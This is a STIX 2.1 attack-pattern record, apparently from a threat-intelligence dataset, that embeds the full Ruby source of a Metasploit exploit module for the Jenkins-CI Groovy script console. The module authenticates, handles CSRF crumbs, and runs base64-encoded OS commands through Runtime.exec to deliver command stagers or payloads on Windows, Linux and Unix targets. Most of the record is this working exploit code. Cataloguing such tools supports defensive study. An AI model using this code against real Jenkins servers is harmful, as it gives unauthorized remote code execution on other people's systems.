{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8b0f9d40-5c2e-486b-8213-fbc53c1b0bc1",
    "created": "2024-08-14T17:09:53.788462Z",
    "modified": "2024-08-14T17:09:53.788466Z",
    "name": "Jenkins-CI Script-Console Java Execution",
    "description": " This module uses the Jenkins-CI Groovy script console to execute OS commands using Java. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/jenkins_script_console.rb",
            "external_id": "jenkins_script_console.rb"
        },
        {
            "source_name": "reference",
            "url": "https://wiki.jenkins-ci.org/display/JENKINS/Jenkins+Script+Console"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Remote::HTTP::Jenkins\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Jenkins-CI Script-Console Java Execution',\n        'Description' => %q{\n          This module uses the Jenkins-CI Groovy script console to execute\n          OS commands using Java.\n        },\n        'Author' => [\n          'Spencer McIntyre',\n          'jamcut',\n          'thesubtlety'\n        ],\n        'License' => MSF_LICENSE,\n        'DefaultOptions' => {\n          'WfsDelay' => '10'\n        },\n        'References' => [\n          ['URL', 'https://wiki.jenkins-ci.org/display/JENKINS/Jenkins+Script+Console']\n        ],\n        'Platform' => %w[win linux unix],\n        'Targets' => [\n          [\n            'Windows',\n            {\n              'Arch' => [ ARCH_X64, ARCH_X86 ],\n              'Platform' => 'win',\n              'CmdStagerFlavor' => [ 'certutil', 'vbs' ]\n            }\n          ],\n          ['Linux', { 'Arch' => [ ARCH_X64, ARCH_X86 ], 'Platform' => 'linux' }],\n          ['Unix CMD', { 'Arch' => ARCH_CMD, 'Platform' => 'unix', 'Payload' => { 'BadChars' => \"\\x22\" } }]\n        ],\n        'DisclosureDate' => '2013-01-18',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE, ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS, ],\n          'Reliability' => [ REPEATABLE_SESSION, ]\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('USERNAME', [ false, 'The username to authenticate as', '' ]),\n        OptString.new('PASSWORD', [ false, 'The password for the specified username', '' ]),\n        OptString.new('API_TOKEN', [ false, 'The API token for the specified username', '' ]),\n        OptString.new('TARGETURI', [ true, 'The path to the Jenkins-CI application', '/jenkins/' ])\n      ]\n    )\n\n    self.needs_cleanup = true\n  end\n\n  def post_auth?\n    true\n  end\n\n  def check\n    uri = target_uri\n    uri.path = normalize_uri(uri.path)\n    uri.path << '/' if uri.path[-1, 1] != '/'\n    res = send_request_cgi({ 'uri' => \"#{uri.path}login\" })\n    if res && res.headers.include?('X-Jenkins')\n      return Exploit::CheckCode::Detected\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def on_new_session(_client)\n    if !@to_delete.nil?\n      print_warning(\"Deleting #{@to_delete} payload file\")\n      execute_command(\"rm #{@to_delete}\")\n    end\n  end\n\n  # This method takes a command and options then attempts to make a request and returns a response\n  #\n  # @param [String] cmd The cmd used\n  # @param [String] _opts Request options\n  # @return [Rex::Proto::Http::Response, nil] res The result of the request\n  def http_send_request(cmd)\n    request_parameters = {\n      'method' => 'POST',\n      'uri' => normalize_uri(@uri.path, 'script'),\n      'authorization' => basic_auth(datastore['USERNAME'], datastore['API_TOKEN']),\n      'vars_post' =>\n        {\n          'script' => java_craft_runtime_exec(cmd),\n          'Submit' => 'Run'\n        }\n    }\n    request_parameters['vars_post'][@crumb[:name]] = @crumb[:value] unless @crumb.nil?\n    send_request_cgi(request_parameters)\n  end\n\n  # This method takes a command and options then attempts to make a request to send the command\n  #\n  # @param [String] cmd The cmd used\n  # @param [String] _opts Request options\n  # @return [Rex::Proto::Http::Response] res The response of the request\n  def http_send_command(cmd, _opts = {})\n    res = http_send_request(cmd)\n\n    fail_with(Failure::Unknown, 'Failed to execute the command.') if res.nil?\n\n    # Attempt to login if we haven't previously\n    if res.code == 401 && !@attempted_login\n      print_status('Authentication required for Jenkins-CI Groovy script console - Logging in...')\n      attempt_jenkins_login\n      res = http_send_request(cmd)\n    end\n\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to Jenkins - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected HTTP response code: #{res.code}\") if res.code != 200\n\n    res\n  end\n\n  def java_craft_runtime_exec(cmd)\n    vars = Rex::RandomIdentifier::Generator.new(\n      Rex::RandomIdentifier::Generator::JavaOpts\n    )\n    jcode = <<~JCODE\n      String #{vars[:encoded]} = \"#{Rex::Text.encode_base64(cmd)}\";\n      byte[] #{vars[:decoded]};\n      try {\n        #{vars[:decoded]} = Base64.getDecoder().decode(#{vars[:encoded]});\n      } catch(groovy.lang.MissingPropertyException e) {\n        Object #{vars[:decoder]} = Eval.me(\"new sun.misc.BASE64Decoder()\");\n        #{vars[:decoded]} = #{vars[:decoder]}.decodeBuffer(#{vars[:encoded]});\n      }\n    JCODE\n\n    jcode << \"String[] #{vars[:cmd_array]} = new String[3];\\n\"\n    if target['Platform'] == 'win'\n      jcode << \"#{vars[:cmd_array]}[0] = \\\"cmd.exe\\\";\\n\"\n      jcode << \"#{vars[:cmd_array]}[1] = \\\"/c\\\";\\n\"\n    else\n      jcode << \"#{vars[:cmd_array]}[0] = \\\"/bin/sh\\\";\\n\"\n      jcode << \"#{vars[:cmd_array]}[1] = \\\"-c\\\";\\n\"\n    end\n    jcode << \"#{vars[:cmd_array]}[2] = new String(#{vars[:decoded]}, \\\"UTF-8\\\");\\n\"\n    jcode << \"Runtime.getRuntime().exec(#{vars[:cmd_array]});\\n\"\n    jcode\n  end\n\n  def execute_command(cmd, _opts = {})\n    vprint_status(\"Attempting to execute: #{cmd}\")\n    http_send_command(cmd.to_s)\n  end\n\n  # This method makes calls to multiple methods to handle Jenkins login attempts\n  def attempt_jenkins_login\n    @attempted_login = true\n    login_uri = jenkins_uri_check(@uri, keep_cookies: true)\n    status, _proof = jenkins_login(datastore['USERNAME'], datastore['PASSWORD'], login_uri)\n\n    if status == Metasploit::Model::Login::Status::INCORRECT\n      fail_with(Msf::Module::Failure::NoAccess, \"Incorrect credentials - #{datastore['USERNAME']}:#{datastore['PASSWORD']}\")\n    elsif status == Metasploit::Model::Login::Status::UNABLE_TO_CONNECT\n      fail_with(Msf::Module::Failure::UnexpectedReply, 'Unexpected reply from server')\n    end\n  end\n\n  def exploit\n    @attempted_login = false\n    @uri = target_uri\n    @uri.path = normalize_uri(@uri.path)\n    @uri.path << '/' if @uri.path[-1, 1] != '/'\n    print_status('Checking access to the script console')\n    res = send_request_cgi({ 'uri' => \"#{@uri.path}script\" })\n    fail_with(Failure::Unknown, 'No Response received') if !res\n\n    @crumb = nil\n    if res.code != 200\n      if datastore['API_TOKEN'].present?\n        print_status('Authenticating with token...')\n        res = send_request_cgi({\n          'method' => 'GET',\n          'uri' => normalize_uri(@uri.path, 'crumbIssuer/api/json'),\n          'authorization' => basic_auth(datastore['USERNAME'], datastore['API_TOKEN'])\n        })\n        if (res && (res.code == 401))\n          fail_with(Failure::NoAccess, 'Login failed')\n        end\n      else\n        print_status('Logging in...')\n        attempt_jenkins_login\n        res = send_request_cgi({ 'uri' => \"#{@uri.path}script\" })\n\n        if res.code == 403\n          fail_with(Failure::NoAccess, \"#{datastore['USERNAME']} does not have permissions to complete this request\")\n        elsif res.code != 200\n          fail_with(Failure::UnexpectedReply, 'Unexpected reply from server')\n        end\n      end\n    else\n      print_status('No authentication required, skipping login...')\n    end\n\n    if res.body =~ /\"\\.crumb\", \"([a-z0-9]*)\"/\n      print_status(\"Using CSRF token: '#{Regexp.last_match(1)}' (.crumb style)\")\n      @crumb = { name: '.crumb', value: Regexp.last_match(1) }\n    elsif res.body =~ /crumb\\.init\\(\"Jenkins-Crumb\", \"([a-z0-9]*)\"\\)/ || res.body =~ /\"crumb\":\"([a-z0-9]*)\"/\n      print_status(\"Using CSRF token: '#{Regexp.last_match(1)}' (Jenkins-Crumb style v1)\")\n      @crumb = { name: 'Jenkins-Crumb', value: Regexp.last_match(1) }\n    elsif res.body =~ /data-crumb-value=\"([a-z0-9]*)\"/\n      print_status(\"Using CSRF token: '#{Regexp.last_match(1)}' (Jenkins-Crumb style v2)\")\n      @crumb = { name: 'Jenkins-Crumb', value: Regexp.last_match(1) }\n    end\n\n    case target['Platform']\n    when 'win'\n      print_status(\"#{rhost}:#{rport} - Sending command stager...\")\n      execute_cmdstager({ linemax: 2049 })\n    when 'unix'\n      print_status(\"#{rhost}:#{rport} - Sending payload...\")\n      http_send_command(payload.encoded.to_s)\n    when 'linux'\n      print_status(\"#{rhost}:#{rport} - Sending Linux stager...\")\n      execute_cmdstager({ linemax: 2049 })\n    end\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-01-18",
    "x_mitre_platforms": [
        "win'"
    ]
}